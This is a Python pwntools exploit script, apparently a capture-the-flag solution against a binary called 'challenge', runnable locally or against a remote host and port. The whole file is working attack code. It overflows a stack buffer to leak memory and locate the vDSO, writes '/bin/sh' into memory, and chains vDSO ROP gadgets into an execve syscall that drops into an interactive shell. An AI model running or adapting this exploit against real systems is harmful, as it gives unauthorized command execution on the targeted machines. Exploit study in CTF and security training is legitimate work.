#!/usr/bin/env python3

from pwn import context, p64, remote, sys, u64


context.binary = 'challenge'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


io = get_process()

io.sendafter(b'Welcome!\n', b'A' * 0x20)
stack_addr = (u64(io.recv()[0x30:0x38]) & ~0xfff) + 0x1000
io.info(f'Stack address: {hex(stack_addr)}')


def find_vdso(haystack):
    for i in range(0, len(haystack), 8):
        addr = u64(haystack[i : i + 8].ljust(8, b'\0'))

        if addr >> 36 == stack_addr >> 36 == 0x7ff and addr & 0xfff == 0 and addr > stack_addr:
            return addr


stack = b''
offset = 0

while not (vdso_addr := find_vdso(stack)):
    payload  = b'A' * 0x20 + p64(context.binary.sym.write)
    payload += p64(0x401094) + p64(0x1800) + p64(stack_addr - offset)
    io.send(payload)
    offset += 0x1800
    stack += io.recvuntil(b'Welcome!\n', drop=True)

io.success(f'vDSO address: {hex(vdso_addr)}')

bin_sh_addr = stack_addr - 0x2000

payload  = b'A' * 0x20 + p64(context.binary.sym.read)
payload += p64(0x401094) + p64(0x8) + p64(bin_sh_addr)
io.send(payload)
io.recv()
io.send(b'/bin/sh\0')
io.recvuntil(b'Welcome!\n')

pop_rdx_pop_rax_ret = vdso_addr + 0xba0
pop_rbx_pop_r12_pop_rbp_ret = vdso_addr + 0x8c6
mov_rdi_rbx_mov_rsi_r12_syscall = vdso_addr + 0x8e3

payload  = b'A' * 0x20
payload += p64(pop_rdx_pop_rax_ret)
payload += p64(0)
payload += p64(0x3b)
payload += p64(pop_rbx_pop_r12_pop_rbp_ret)
payload += p64(bin_sh_addr)
payload += p64(0)
payload += p64(0)
payload += p64(mov_rdi_rbx_mov_rsi_r12_syscall)

io.send(payload)
io.recv()
io.interactive()
